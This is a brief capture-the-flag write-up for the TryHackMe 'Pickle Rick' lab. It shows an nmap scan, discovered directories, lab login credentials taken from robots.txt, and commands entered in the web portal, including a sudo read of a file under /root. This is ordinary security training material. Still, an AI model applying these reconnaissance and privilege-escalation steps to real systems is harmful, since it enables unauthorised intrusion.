# TRYHACKME : Pickle Rick
> **NOTE: Straightforward write-up. If not for you, go search somewhere else.**
## NMAP SCAN
```
nmap -sVC -T5 10.10.238.123
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 
Nmap scan report for 10.10.238.123
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ub
| ssh-hostkey: 
|   3072 7f:5b:85:3b:9b:cd:09:0f:a6:5a:16:06:1a:61:aa:91 
|   256 55:15:f1:08:83:83:48:37:b5:1f:b2:f1:f4:f2:03:8e (
|_  256 fd:93:94:48:47:1b:ea:d3:3a:5f:56:f5:ce:b8:d8:00 (
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## DIRBUSTER
```
/login.php
/assets
/robots.txt
        Wubbalubbadubdub
/portal.php
```

## /login.php
- Username: R1ckRul3s
- Password: Wubbalubbadubdub

## Rick Portal
```
less Sup3rS3cretPickl3Ingred.txt
less clue.txt
less /home/rick/"second ingredients"
sudo less ../../../root/3rd.txt
```
                                    
